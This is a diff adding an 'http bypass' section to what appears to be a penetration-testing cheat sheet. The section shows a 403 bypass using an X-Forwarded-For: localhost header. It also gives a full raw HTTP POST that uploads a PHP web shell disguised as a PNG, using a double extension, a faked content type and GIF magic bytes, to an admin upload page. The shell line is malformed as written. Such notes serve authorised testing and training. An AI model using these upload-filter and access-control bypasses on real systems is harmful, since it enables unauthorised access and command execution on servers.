@@ -166,6 +166,35 @@ droopescan scan drupal -u <url>
 binwalk -e save.zip 
 ```
 
+### http bypass
+HTTP/1.0 403 Forbidden --> X-Forwarded-for: localhost
+```shell
+POST /administration/upload/ HTTP/1.1
+Host: 192.168.86.138
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.86.138/administration/upload/
+Cookie: PHPSESSID=agdfgv7fqdloo98eumakfojgb7
+Connection: close
+Content-Type: multipart/form-data; boundary=---------------------------10131357035256004441892031456
+Content-Length: 378
+
+-----------------------------10131357035256004441892031456
+Content-Disposition: form-data; name="document"; filename="**webshell.php.png**"
+Content-Type: **image/png**
+
+**GIF89:**
+**<?php system(['cmd']); ?>**
+
+-----------------------------10131357035256004441892031456
+Content-Disposition: form-data; name="submit"
+Send
+-----------------------------10131357035256004441892031456--
+```
+
+
 # Explotation
 ```bash
 searchsploit <>
